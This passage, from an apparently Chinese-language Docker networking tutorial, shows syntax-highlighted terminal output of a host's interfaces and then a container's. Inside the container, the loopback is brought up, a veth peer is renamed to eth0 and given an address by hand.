<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ::1/128</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ens160:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mq</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:0c:29:7c:f4:a1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 192.168.23.129/24</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 192.168.23.255</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> global</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noprefixroute</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dynamic</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ens160</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1187sec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1187sec</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fe80::d72d:aac0:a50c:7cd8/64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noprefixroute</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">3:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 02:42:12:70:3f:6e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 172.17.0.1/16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.17.255.255</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> global</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fe80::42:12ff:fe70:3f6e/64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">13:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> veth5472ca8@if12:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> master</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ca:5b:ee:25:7e:17</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fe80::c85b:eeff:fe25:7e17/64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">15:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> h2390@if14:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">NO-CARRIER,BROADCAST,MULTICAST,U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> master</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> LOWERLAYERDOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ca:c2:d1:86:8c:e1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 容器内</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ping 8.8.8.8</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">connect:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> unreachable</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ip a</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBAC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">K&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ip l</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBAC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">K&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">14:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> c2390@if15:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">T&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DEFAULT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 7a:16:72:92:97:ea</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ip link set lo up</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ip a</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBACK,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UNKNOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 127.0.0.1/8</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ::1/128</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">14:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> c2390@if15:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">T&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 7a:16:72:92:97:ea</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ip link set c2390@if15 name eth0 up</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Cannot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> find</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> device</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "c2390@if15"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ip link set c2390 name eth0 up</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]#</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ip a</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBACK,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UNKNOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 127.0.0.1/8</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ::1/128</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">14:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> eth0@if15:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">BROADCAST,MULTICAST,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1500</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/ether</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 7a:16:72:92:97:ea</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ff:ff:ff:ff:ff:ff</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link-netnsid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fe80::7816:72ff:fe92:97ea/64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> link</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ip addr add 172.17.0.10/16 dev eth0</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# ip a</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">LOOPBACK,UP,LOWER_U</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">P&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">mtu</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qdisc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> noqueue</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> state</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> UNKNOWN</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> qlen</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    link/loopback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> brd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 00:00:00:00:00:00</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 127.0.0.1/8</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       valid_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> preferred_lft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> forever</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    inet6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ::1/128</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> scope</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span></span>
